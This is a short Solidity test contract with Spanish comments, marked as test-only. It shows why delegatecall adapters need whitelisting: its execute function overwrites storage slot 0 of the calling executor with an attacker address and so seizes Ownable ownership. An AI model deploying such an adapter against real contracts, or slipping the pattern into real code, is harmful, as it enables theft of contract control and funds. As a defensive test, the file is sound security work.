// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IAdapter} from "../adapters/IAdapter.sol";

/// @title EvilAdapter — SÓLO PARA TESTS: demuestra por qué los adapters deben whitelistearse
/// @notice Ejecutado vía delegatecall, escribe el slot 0 del executor (donde Ownable guarda
///         `_owner`) y se roba la propiedad. Nunca aprobar un adapter sin auditarlo.
contract EvilAdapter is IAdapter {
    /// @notice Dirección que quedará como owner del executor víctima.
    address public immutable attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    /// @dev Como corre por delegatecall, `sstore(0, …)` pisa el storage del EXECUTOR.
    function execute(bytes calldata, uint256 prev) external payable returns (uint256) {
        address a = attacker; // immutable: vive en el bytecode, así que se lee bien vía delegatecall
        assembly {
            sstore(0, a)
        }
        return prev;
    }
}
